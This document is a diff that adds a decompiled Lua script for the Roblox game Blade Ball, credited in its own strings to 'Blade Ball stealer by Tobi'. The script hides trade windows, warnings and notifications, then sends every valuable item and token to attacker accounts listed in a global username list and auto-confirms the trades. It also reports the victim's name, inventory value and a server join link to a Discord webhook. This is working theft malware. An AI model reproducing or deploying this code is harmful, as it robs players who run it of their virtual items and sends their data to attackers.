@@ -1,0 +1,1037 @@
+-- [[ SCRIPT RECONSTRUÍDO MÓDULO EXTERNO ]]
+-- [[ FLUXO REPARADO POR HEURÍSTICA ]]
+
+local v69, v60, v66, v63, v55, v53, v50, v48, v61, v58, v17, v21, v8, v26, v34, v37, v43, v47, v31, v16, v27, v9, v13, v11, v40, v20, v18, v33, v30, v28, v42, v45, v39, v4, v5, v1, v2, v10, v14, v6, v35, v46, v32, v29, v22, v19, v44, v41, v15, v12, v3
+v69 = _G
+v60 = _G
+v60 = v60.scriptExecuted
+if not v60 then
+	v60 = false
+end
+v69.scriptExecuted = v60
+v69 = _G
+v69 = v69.scriptExecuted
+if v69 then
+	return
+end
+v69 = _G
+v69.scriptExecuted = true
+v69 = {}
+v60 = {}
+v66 = "Sword"
+v63 = "Emote"
+v55 = "Explosion"
+v60[1] = v66
+v60[2] = v63
+v60[3] = v55
+v66 = game
+v63 = v66
+v66 = v66.GetService
+v55 = "Players"
+v66 = v66(v63, v55)
+v63 = v66.LocalPlayer
+v55 = game
+v53 = v55
+v55 = v55.GetService
+v50 = "HttpService"
+v55 = v55(v53, v50)
+v53 = game
+v50 = v53
+v53 = v53.GetService
+v48 = "ReplicatedStorage"
+v53 = v53(v50, v48)
+v50 = v53
+v53 = v53.WaitForChild
+v48 = "Packages"
+v53 = v53(v50, v48)
+v50 = v53
+v53 = v53.WaitForChild
+v48 = "_Index"
+v53 = v53(v50, v48)
+v50 = v53
+v53 = v53.WaitForChild
+v48 = "sleitnick_net@0.1.0"
+v53 = v53(v50, v48)
+v50 = v53
+v53 = v53.WaitForChild
+v48 = "net"
+v53 = v53(v50, v48)
+v50 = v63.PlayerGui
+v48 = v50.Trade
+v61 = false
+v58 = v50.Notifications
+v17 = v50.TradeCompleted
+v21 = require
+v8 = game
+v8 = v8.ReplicatedStorage
+v8 = v8.Shared
+v8 = v8.Inventory
+v8 = v8.Client
+v21 = v21(v8)
+v21 = v21.Get
+v21 = v21()
+v8 = require
+v26 = game
+v26 = v26.ReplicatedStorage
+v26 = v26.Packages
+v26 = v26.Replion
+v8 = v8(v26)
+v26 = _G
+v26 = v26.Usernames
+if not v26 then
+	v26 = {}
+end
+v34 = _G
+v34 = v34.min_rap
+if not v34 then
+	v34 = 100
+end
+v37 = _G
+v37 = v37.pingEveryone
+if not v37 then
+	v37 = "No"
+end
+v43 = _G
+v43 = v43.webhook
+if not v43 then
+	v43 = ""
+end
+v47 = next
+v31 = v26
+v47 = v47(v31)
+if v47 == nil or v43 == "" then
+	v31 = v63
+	v47 = v63.kick
+	v16 = "You didn't add usernames or webhook"
+	v47(v31, v16)
+	return
+end
+v47 = game
+v47 = v47.PlaceId
+if v47 ~= 13772394625 then
+	v31 = v63
+	v47 = v63.kick
+	v16 = "Game not supported. Please join a normal Blade Ball server"
+	v47(v31, v16)
+	return
+end
+v31 = v66
+v47 = v66.GetPlayers
+v47 = v47(v31)
+v47 = #v47
+if 16 <= v47 then
+	v31 = v63
+	v47 = v63.kick
+	v16 = "Server is full. Please join a less populated server"
+	v47(v31, v16)
+	return
+end
+v47 = game
+v31 = v47
+v47 = v47.GetService
+v16 = "RobloxReplicatedStorage"
+v47 = v47(v31, v16)
+v31 = v47
+v47 = v47.WaitForChild
+v16 = "GetServerType"
+v47 = v47(v31, v16)
+v31 = v47
+v47 = v47.InvokeServer
+v47 = v47(v31)
+if v47 == "VIPServer" then
+	v31 = v63
+	v47 = v63.kick
+	v16 = "Server error. Please join a DIFFERENT server"
+	v47(v31, v16)
+	return
+end
+v47 = {}
+v31 = {}
+v31.option = "PIN"
+v31.value = "9079"
+v47[1] = v31
+v16 = v53
+v31 = v53.WaitForChild
+v27 = "RF/ResetPINCode"
+v31 = v31(v16, v27)
+v16 = v31
+v31 = v31.InvokeServer
+v27 = unpack
+v9 = v47
+v27, v9, v13, v11, v40, v20, v18, v33, v30, v28, v42, v45, v39, v4, v5, v1, v2, v10, v14, v6, v35, v46, v32, v29, v22, v19, v44, v41, v15, v12, v3 =
+	v27(v9)
+v31, v16 = v31(
+	v16,
+	v27,
+	v9,
+	v13,
+	v11,
+	v40,
+	v20,
+	v18,
+	v33,
+	v30,
+	v28,
+	v42,
+	v45,
+	v39,
+	v4,
+	v5,
+	v1,
+	v2,
+	v10,
+	v14,
+	v6,
+	v35,
+	v46,
+	v32,
+	v29,
+	v22,
+	v19,
+	v44,
+	v41,
+	v15,
+	v12,
+	v3
+)
+if v16 ~= "You don't have a PIN code" then
+	v9 = v63
+	v27 = v63.kick
+	v13 = "Account error. Please disable trade PIN and try again"
+	v27(v9, v13)
+	return
+end
+v27 = v48.Black
+v27.Visible = false
+v27 = v48.MiscChat
+v27.Visible = false
+v27 = v17.Black
+v27.Visible = false
+v27 = v17.Main
+v27.Visible = false
+v27 = v48.Main
+v27.Visible = false
+v13 = v27
+v9 = v27.GetPropertyChangedSignal
+v11 = "Visible"
+v9 = v9(v13, v11)
+v13 = v9
+v9 = v9.Connect
+function v11()
+	local v68
+	v68 = v27
+	v68.Visible = false
+end
+v9(v13, v11)
+v9 = v48.UnfairTradeWarning
+v9.Visible = false
+v11 = v9
+v13 = v9.GetPropertyChangedSignal
+v40 = "Visible"
+v13 = v13(v11, v40)
+v11 = v13
+v13 = v13.Connect
+function v40()
+	local v68
+	v68 = v9
+	v68.Visible = false
+end
+v13(v11, v40)
+v13 = v58.Notifications
+v13.Visible = false
+v40 = v13
+v11 = v13.GetPropertyChangedSignal
+v20 = "Visible"
+v11 = v11(v40, v20)
+v40 = v11
+v11 = v11.Connect
+function v20()
+	local v68
+	v68 = v13
+	v68.Visible = false
+end
+v11(v40, v20)
+v40 = v48
+v11 = v48.GetPropertyChangedSignal
+v20 = "Enabled"
+v11 = v11(v40, v20)
+v40 = v11
+v11 = v11.Connect
+function v20()
+	local v68
+	v68 = v48
+	v68 = v68.Enabled
+	v61 = v68
+end
+v11(v40, v20)
+function v11(A0_2)
+	local v62, v67, v65, v54, v52
+	v62 = {}
+	v67 = game
+	v65 = v67
+	v67 = v67.GetService
+	v54 = "Players"
+	v67 = v67(v65, v54)
+	v65 = v67
+	v67 = v67.WaitForChild
+	v54 = A0_2
+	v67 = v67(v65, v54)
+	v62[1] = v67
+	repeat
+		v67 = wait
+		v65 = 0.1
+		v67(v65)
+		v67 = v53
+		v65 = v67
+		v67 = v67.WaitForChild
+		v54 = "RF/Trading/SendTradeRequest"
+		v67 = v67(v65, v54)
+		v65 = v67
+		v67 = v67.InvokeServer
+		v54 = unpack
+		v52 = v62
+		v54, v52 = v54(v52)
+		v67 = v67(v65, v54, v52)
+	until v67 == true
+end
+function v40(A0_2, A1_2)
+	local v67, v65, v54, v52, v51
+	v67 = {}
+	v67[1] = A0_2
+	v67[2] = A1_2
+	repeat
+		v65 = v53
+		v54 = v65
+		v65 = v65.WaitForChild
+		v52 = "RF/Trading/AddItemToTrade"
+		v65 = v65(v54, v52)
+		v54 = v65
+		v65 = v65.InvokeServer
+		v52 = unpack
+		v51 = v67
+		v52, v51 = v52(v51)
+		v65 = v65(v54, v52, v51)
+	until v65 == true
+end
+function v20()
+	local v68, v62, v67, v65, v54
+	v68 = {}
+	v68[1] = true
+	repeat
+		v62 = wait
+		v67 = 0.1
+		v62(v67)
+		v62 = v53
+		v67 = v62
+		v62 = v62.WaitForChild
+		v65 = "RF/Trading/ReadyUp"
+		v62 = v62(v67, v65)
+		v67 = v62
+		v62 = v62.InvokeServer
+		v65 = unpack
+		v54 = v68
+		v65, v54 = v65(v54)
+		v62 = v62(v67, v65, v54)
+	until v62 == true
+end
+function v18()
+	local v68, v62, v67
+	repeat
+		v68 = wait
+		v62 = 0.1
+		v68(v62)
+		v68 = v53
+		v62 = v68
+		v68 = v68.WaitForChild
+		v67 = "RF/Trading/ConfirmTrade"
+		v68 = v68(v62, v67)
+		v62 = v68
+		v68 = v68.InvokeServer
+		v68(v62)
+		v68 = v61
+	until not v68
+end
+function v33(A0_2)
+	local v62, v67, v65, v54, v52, v51
+	if A0_2 == nil then
+		v62 = "0"
+		return v62
+	end
+	v62 = {}
+	v67 = ""
+	v65 = "k"
+	v54 = "m"
+	v52 = "b"
+	v51 = "t"
+	v62[1] = v67
+	v62[2] = v65
+	v62[3] = v54
+	v62[4] = v52
+	v62[5] = v51
+	v67 = 1
+	while 1000 <= A0_2 do
+		v65 = #v62
+		if not (v67 < v65) then
+			break
+		end
+		A0_2 = A0_2 / 1000
+		v67 = v67 + 1
+	end
+	if v67 == 1 then
+		v65 = tostring
+		v54 = math
+		v54 = v54.floor
+		v52 = A0_2
+		v54, v52, v51 = v54(v52)
+		return v65(v54, v52, v51)
+	end
+	v65 = math
+	v65 = v65.floor
+	v54 = A0_2
+	v65 = v65(v54)
+	if A0_2 == v65 then
+		v65 = string
+		v65 = v65.format
+		v54 = "%d%s"
+		v52 = A0_2
+		v51 = v62[v67]
+		return v65(v54, v52, v51)
+	end
+	v65 = string
+	v65 = v65.format
+	v54 = "%.2f%s"
+	v52 = A0_2
+	v51 = v62[v67]
+end
+v30 = 0
+function v28(A0_2, A1_2)
+	local v67, v65, v54, v52, v51, v49, v59, v57, v23, v24, v7, v25, v36, v38
+	v67 = {}
+	v65 = {}
+	v65.name = "Victim Username:"
+	v54 = v63
+	v54 = v54.Name
+	v65.value = v54
+	v65.inline = true
+	v54 = {}
+	v54.name = "Join link:"
+	v52 = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId="
+	v51 = game
+	v51 = v51.JobId
+	v52 = v52 .. v51
+	v54.value = v52
+	v52 = {}
+	v52.name = "Item list:"
+	v52.value = ""
+	v52.inline = false
+	v51 = {}
+	v51.name = "Summary:"
+	v49 = string
+	v49 = v49.format
+	v59 = "Total RAP: %s"
+	v57 = v33
+	v23 = v30
+	v57, v23, v24, v7, v25, v36, v38 = v57(v23)
+	v49 = v49(v59, v57, v23, v24, v7, v25, v36, v38)
+	v51.value = v49
+	v51.inline = false
+	v67[1] = v65
+	v67[2] = v54
+	v67[3] = v52
+	v67[4] = v51
+	v65 = {}
+	v54 = ipairs
+	v52 = A0_2
+	v54, v52, v51 = v54(v52)
+	for v49, v59 in v54, v52, v51 do
+		v57 = v59.Name
+		v57 = v65[v57]
+		if v57 then
+			v57 = v59.Name
+			v57 = v65[v57]
+			v23 = v59.Name
+			v23 = v65[v23]
+			v23 = v23.Count
+			v23 = v23 + 1
+			v57.Count = v23
+			v57 = v59.Name
+			v57 = v65[v57]
+			v23 = v59.Name
+			v23 = v65[v23]
+			v23 = v23.TotalRAP
+			v24 = v59.RAP
+			v23 = v23 + v24
+			v57.TotalRAP = v23
+		else
+			v57 = v59.Name
+			v23 = {}
+			v24 = v59.Name
+			v23.Name = v24
+			v23.Count = 1
+			v24 = v59.RAP
+			v23.TotalRAP = v24
+			v65[v57] = v23
+		end
+	end
+	v54 = {}
+	v52 = pairs
+	v51 = v65
+	v52, v51, v49 = v52(v51)
+	for v59, v57 in v52, v51, v49 do
+		v23 = table
+		v23 = v23.insert
+		v24 = v54
+		v7 = v57
+		v23(v24, v7)
+	end
+	v52 = table
+	v52 = v52.sort
+	v51 = v54
+	function v49(A0_3, A1_3)
+		local v70, v64
+		v70 = A0_3.TotalRAP
+		v64 = A1_3.TotalRAP
+		v70 = v70 > v64
+	end
+	v52(v51, v49)
+	v52 = ipairs
+	v51 = v54
+	v52, v51, v49 = v52(v51)
+	for v59, v57 in v52, v51, v49 do
+		v23 = string
+		v23 = v23.format
+		v24 = "%s (x%s) - %s RAP"
+		v7 = v57.Name
+		v25 = v57.Count
+		v36 = v33
+		v38 = v57.TotalRAP
+		v36, v38 = v36(v38)
+		v23 = v23(v24, v7, v25, v36, v38)
+		v24 = v67[3]
+		v7 = v67[3]
+		v7 = v7.value
+		v25 = v23
+		v36 = "\n"
+		v7 = v7 .. v25 .. v36
+		v24.value = v7
+	end
+	v52 = v67[3]
+	v52 = v52.value
+	v52 = #v52
+	if 1024 < v52 then
+		v52 = {}
+		v51 = v67[3]
+		v51 = v51.value
+		v49 = v51
+		v51 = v51.gmatch
+		v59 = "[^\r\n]+"
+		v51, v49, v59 = v51(v49, v59)
+		for v57 in v51, v49, v59 do
+			v23 = table
+			v23 = v23.insert
+			v24 = v52
+			v7 = v57
+			v23(v24, v7)
+		end
+		while true do
+			v51 = v67[3]
+			v51 = v51.value
+			v51 = #v51
+			if not (1024 < v51) then
+				break
+			end
+			v51 = #v52
+			if not (0 < v51) then
+				break
+			end
+			v51 = table
+			v51 = v51.remove
+			v49 = v52
+			v51(v49)
+			v51 = v67[3]
+			v49 = table
+			v49 = v49.concat
+			v59 = v52
+			v57 = "\n"
+			v49 = v49(v59, v57)
+			v59 = [[
+Plus more!]]
+			v49 = v49 .. v59
+			v51.value = v49
+		end
+	end
+	v52 = {}
+	v51 = A1_2
+	v49 = "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '"
+	v59 = game
+	v59 = v59.JobId
+	v57 = "')"
+	v51 = v51 .. v49 .. v59 .. v57
+	v52.content = v51
+	v51 = {}
+	v49 = {}
+	v49.title = "\240\159\148\180 Join to get Blade Ball hit"
+	v49.color = 65280
+	v49.fields = v67
+	v59 = {}
+	v59.text = "Blade Ball stealer by Tobi. discord.gg/GY2RVSEGDT"
+	v49.footer = v59
+	v51[1] = v49
+	v52.embeds = v51
+	v51 = v55
+	v49 = v51
+	v51 = v51.JSONEncode
+	v59 = v52
+	v51 = v51(v49, v59)
+	v49 = {}
+	v49["Content-Type"] = "application/json"
+	v59 = request
+	v57 = {}
+	v23 = v43
+	v57.Url = v23
+	v57.Method = "POST"
+	v57.Headers = v49
+	v57.Body = v51
+	v59 = v59(v57)
+end
+function v42(A0_2)
+	local v62, v67, v65, v54, v52, v51, v49, v59, v57, v23, v24, v7, v25, v36
+	v62 = {}
+	v67 = {}
+	v67.name = "Victim Username:"
+	v65 = v63
+	v65 = v65.Name
+	v67.value = v65
+	v67.inline = true
+	v65 = {}
+	v65.name = "Items sent:"
+	v65.value = ""
+	v65.inline = true
+	v54 = {}
+	v54.name = "Summary:"
+	v52 = string
+	v52 = v52.format
+	v51 = "Total RAP: %s"
+	v49 = v33
+	v59 = v30
+	v49, v59, v57, v23, v24, v7, v25, v36 = v49(v59)
+	v52 = v52(v51, v49, v59, v57, v23, v24, v7, v25, v36)
+	v54.value = v52
+	v54.inline = false
+	v62[1] = v67
+	v62[2] = v65
+	v62[3] = v54
+	v67 = {}
+	v65 = ipairs
+	v54 = A0_2
+	v65, v54, v52 = v65(v54)
+	for v51, v49 in v65, v54, v52 do
+		v59 = v49.Name
+		v59 = v67[v59]
+		if v59 then
+			v59 = v49.Name
+			v59 = v67[v59]
+			v57 = v49.Name
+			v57 = v67[v57]
+			v57 = v57.Count
+			v57 = v57 + 1
+			v59.Count = v57
+			v59 = v49.Name
+			v59 = v67[v59]
+			v57 = v49.Name
+			v57 = v67[v57]
+			v57 = v57.TotalRAP
+			v23 = v49.RAP
+			v57 = v57 + v23
+			v59.TotalRAP = v57
+		else
+			v59 = v49.Name
+			v57 = {}
+			v23 = v49.Name
+			v57.Name = v23
+			v57.Count = 1
+			v23 = v49.RAP
+			v57.TotalRAP = v23
+			v67[v59] = v57
+		end
+	end
+	v65 = {}
+	v54 = pairs
+	v52 = v67
+	v54, v52, v51 = v54(v52)
+	for v49, v59 in v54, v52, v51 do
+		v57 = table
+		v57 = v57.insert
+		v23 = v65
+		v24 = v59
+		v57(v23, v24)
+	end
+	v54 = table
+	v54 = v54.sort
+	v52 = v65
+	function v51(A0_3, A1_3)
+		local v70, v64
+		v70 = A0_3.TotalRAP
+		v64 = A1_3.TotalRAP
+		v70 = v70 > v64
+	end
+	v54(v52, v51)
+	v54 = ipairs
+	v52 = v65
+	v54, v52, v51 = v54(v52)
+	for v49, v59 in v54, v52, v51 do
+		v57 = string
+		v57 = v57.format
+		v23 = "%s (x%s) - %s RAP"
+		v24 = v59.Name
+		v7 = v59.Count
+		v25 = v33
+		v36 = v59.TotalRAP
+		v25, v36 = v25(v36)
+		v57 = v57(v23, v24, v7, v25, v36)
+		v23 = v62[2]
+		v24 = v62[2]
+		v24 = v24.value
+		v7 = v57
+		v25 = "\n"
+		v24 = v24 .. v7 .. v25
+		v23.value = v24
+	end
+	v54 = v62[2]
+	v54 = v54.value
+	v54 = #v54
+	if 1024 < v54 then
+		v54 = {}
+		v52 = v62[2]
+		v52 = v52.value
+		v51 = v52
+		v52 = v52.gmatch
+		v49 = "[^\r\n]+"
+		v52, v51, v49 = v52(v51, v49)
+		for v59 in v52, v51, v49 do
+			v57 = table
+			v57 = v57.insert
+			v23 = v54
+			v24 = v59
+			v57(v23, v24)
+		end
+		while true do
+			v52 = v62[2]
+			v52 = v52.value
+			v52 = #v52
+			if not (1024 < v52) then
+				break
+			end
+			v52 = #v54
+			if not (0 < v52) then
+				break
+			end
+			v52 = table
+			v52 = v52.remove
+			v51 = v54
+			v52(v51)
+			v52 = v62[2]
+			v51 = table
+			v51 = v51.concat
+			v49 = v54
+			v59 = "\n"
+			v51 = v51(v49, v59)
+			v49 = [[
+Plus more!]]
+			v51 = v51 .. v49
+			v52.value = v51
+		end
+	end
+	v54 = {}
+	v52 = {}
+	v51 = {}
+	v51.title = "\240\159\148\180 New Blade Ball Execution"
+	v51.color = 65280
+	v51.fields = v62
+	v49 = {}
+	v49.text = "Blade Ball stealer by Tobi. discord.gg/GY2RVSEGDT"
+	v51.footer = v49
+	v52[1] = v51
+	v54.embeds = v52
+	v52 = v55
+	v51 = v52
+	v52 = v52.JSONEncode
+	v49 = v54
+	v52 = v52(v51, v49)
+	v51 = {}
+	v51["Content-Type"] = "application/json"
+	v49 = request
+	v59 = {}
+	v57 = v43
+	v59.Url = v57
+	v59.Method = "POST"
+	v59.Headers = v51
+	v59.Body = v52
+	v49 = v49(v59)
+end
+v45 = v8.Client
+v39 = v45
+v45 = v45.GetReplion
+v4 = "ItemRAP"
+v45 = v45(v39, v4)
+v39 = v45.Data
+v39 = v39.Items
+function v4(A0_2)
+	local v62, v67, v65, v54, v52, v51, v49, v59, v57, v23, v24, v7, v25, v36, v38
+	v62 = {}
+	v67 = v39
+	v67 = v67[A0_2]
+	if not v67 then
+		return v62
+	end
+	v65 = pairs
+	v54 = v67
+	v65, v54, v52 = v65(v54)
+	for v51, v49 in v65, v54, v52 do
+		v59 = pcall
+		function v57()
+			local v71, v56, v70
+			v71 = v55
+			v56 = v71
+			v71 = v71.JSONDecode
+			v70 = v51
+		end
+		v59, v57 = v59(v57)
+		if v59 then
+			v23 = type
+			v24 = v57
+			v23 = v23(v24)
+			if v23 == "table" then
+				v23 = ipairs
+				v24 = v57
+				v23, v24, v7 = v23(v24)
+				for v25, v36 in v23, v24, v7 do
+					v38 = v36[1]
+					if v38 == "Name" then
+						v38 = v36[2]
+						v62[v38] = v49
+						break
+					end
+				end
+			end
+		end
+	end
+end
+v5 = {}
+v1 = ipairs
+v2 = v60
+v1, v2, v10 = v1(v2)
+for v14, v6 in v1, v2, v10 do
+	v35 = v4
+	v46 = v6
+	v35 = v35(v46)
+	v5[v6] = v35
+end
+function v1(A0_2, A1_2)
+	local v67, v65, v54
+	v67 = v5
+	v67 = v67[A0_2]
+	if v67 then
+		v65 = v67[A1_2]
+		if v65 then
+			return v65
+		end
+		v54 = 0
+		return v54
+	end
+	v65 = 0
+end
+v2 = ipairs
+v10 = v60
+v2, v10, v14 = v2(v10)
+for v6, v35 in v2, v10, v14 do
+	v46 = pairs
+	v32 = v21[v35]
+	v46, v32, v29 = v46(v32)
+	for v22, v19 in v46, v32, v29 do
+		v44 = v19.TradeLock
+		if not v44 then
+			v44 = v19.Name
+			v41 = v1
+			v15 = v35
+			v12 = v44
+			v41 = v41(v15, v12)
+			if v34 <= v41 then
+				v30 = v30 + v41
+				v15 = table
+				v15 = v15.insert
+				v12 = v69
+				v3 = {}
+				v3.ItemID = v22
+				v3.RAP = v41
+				v3.itemType = v35
+				v3.Name = v44
+				v15(v12, v3)
+			end
+		end
+	end
+end
+v2 = #v69
+if 0 < v2 then
+	v2 = table
+	v2 = v2.sort
+	v10 = v69
+	function v14(A0_2, A1_2)
+		local v67, v65
+		v67 = A0_2.RAP
+		v65 = A1_2.RAP
+		v67 = v67 > v65
+	end
+	v2(v10, v14)
+	v2 = {}
+	v10 = ipairs
+	v14 = v69
+	v10, v14, v6 = v10(v14)
+	for v35, v46 in v10, v14, v6 do
+		v2[v35] = v46
+	end
+	v10 = ""
+	if v37 == "Yes" then
+		v10 = "--[[@everyone]] "
+	end
+	v14 = v28
+	v6 = v69
+	v35 = v10
+	v14(v6, v35)
+	function v14(A0_2, A1_2)
+		local v67, v65, v54, v52, v51, v49, v59, v57, v23, v24
+		v67 = {}
+		v65 = 1
+		v54 = math
+		v54 = v54.min
+		v52 = A1_2
+		v51 = #A0_2
+		v54 = v54(v52, v51)
+		v52 = 1
+		for v51 = v65, v54, v52 do
+			v49 = table
+			v49 = v49.insert
+			v59 = v67
+			v57 = table
+			v57 = v57.remove
+			v23 = A0_2
+			v24 = 1
+			v57, v23, v24 = v57(v23, v24)
+			v49(v59, v57, v23, v24)
+		end
+	end
+	function v6(A0_2)
+		local v62, v67, v65, v54, v52, v51, v49, v59, v57
+		while true do
+			v62 = v69
+			v62 = #v62
+			if not (0 < v62) then
+				break
+			end
+			v62 = v11
+			v67 = A0_2
+			v62(v67)
+			repeat
+				v62 = wait
+				v67 = 0.5
+				v62(v67)
+				v62 = v61
+			until v62
+			v62 = v14
+			v67 = v69
+			v65 = 100
+			v62 = v62(v67, v65)
+			v67 = ipairs
+			v65 = v62
+			v67, v65, v54 = v67(v65)
+			for v52, v51 in v67, v65, v54 do
+				v49 = v40
+				v59 = v51.itemType
+				v57 = v51.ItemID
+				v49(v59, v57)
+			end
+			v67 = v50
+			v67 = v67.TradeRequest
+			v67 = v67.Main
+			v67 = v67.Currency
+			v67 = v67.Coins
+			v67 = v67.Amount
+			v67 = v67.Text
+			v54 = v67
+			v65 = v67.gsub
+			v52 = "^%s*(.-)%s*$"
+			v51 = "%1"
+			v65 = v65(v54, v52, v51)
+			v52 = v65
+			v54 = v65.gsub
+			v51 = "[^%d]"
+			v49 = ""
+			v54 = v54(v52, v51, v49)
+			v52 = tonumber
+			v51 = v54
+			v52 = v52(v51)
+			if not v52 then
+				v52 = 0
+			end
+			if 1 <= v52 then
+				v51 = v53
+				v49 = v51
+				v51 = v51.WaitForChild
+				v59 = "RF/Trading/AddTokensToTrade"
+				v51 = v51(v49, v59)
+				v49 = v51
+				v51 = v51.InvokeServer
+				v59 = v52
+				v51(v49, v59)
+			end
+			v51 = v20
+			v51()
+			v51 = v18
+			v51()
+		end
+	end
+	function v35()
+		local v68, v62, v67, v65, v54, v52, v51, v49, v59
+		v68 = false
+		function v62(A0_3)
+			local v56, v70, v64
+			v56 = table
+			v56 = v56.find
+			v70 = v26
+			v64 = A0_3.Name
+			v56 = v56(v70, v64)
+			if v56 then
+				v56 = v68
+				if not v56 then
+					v56 = v42
+					v70 = v2
+					v56(v70)
+					v56 = true
+					v68 = v56
+				end
+				v56 = v6
+				v70 = A0_3.Name
+				v56(v70)
+			end
+		end
+		v67 = ipairs
+		v65 = v66
+		v54 = v65
+		v65 = v65.GetPlayers
+		v65, v54, v52, v51, v49, v59 = v65(v54)
+		v67, v65, v54 = v67(v65, v54, v52, v51, v49, v59)
+		for v52, v51 in v67, v65, v54 do
+			v49 = v62
+			v59 = v51
+			v49(v59)
+		end
+		v67 = v66
+		v67 = v67.PlayerAdded
+		v65 = v67
+		v67 = v67.Connect
+		v54 = v62
+		v67(v65, v54)
+	end
+	v46 = v35
+	v46()
+end
